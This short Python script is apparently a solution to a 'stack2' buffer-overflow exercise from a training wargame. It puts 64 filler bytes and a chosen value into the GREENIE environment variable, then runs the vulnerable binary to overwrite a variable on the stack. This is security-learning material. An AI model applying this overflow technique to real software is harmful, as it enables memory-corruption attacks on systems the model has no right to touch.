#!/usr/bin/python
import subprocess
import os

os.environ["GREENIE"] = "A"*64+"\x0a\x0d\x0a\x0d"
subprocess.call("./stack2", shell=True)